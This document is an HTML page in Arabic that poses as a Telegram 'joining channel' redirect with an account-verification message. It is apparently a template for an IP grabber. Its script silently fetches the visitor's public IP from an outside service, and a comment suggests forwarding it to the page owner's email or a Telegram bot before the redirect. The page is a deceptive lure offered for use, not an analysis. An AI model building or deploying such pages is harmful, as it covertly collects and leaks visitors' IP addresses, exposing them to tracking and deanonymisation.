<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Joining Channel...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f0f2f5; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>جارٍ التحقق من الحساب والتحويل إلى تليجرام...</h2>

    <script>
        // كود بديل لسحب الـ IP باستخدام خدمة خارجية مجانية
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                console.log("IP Address:", data.ip);
                // هنا يمكنك إرسال الـ IP إلى إيميلك أو Bot تليجرام
                
                // التحويل التلقائي بعد 3 ثوانٍ
                setTimeout(() => {
                    window.location.href = "https://t.me/your_channel_name"; 
                }, 3000);
            });
    </script>
</body>
</html>
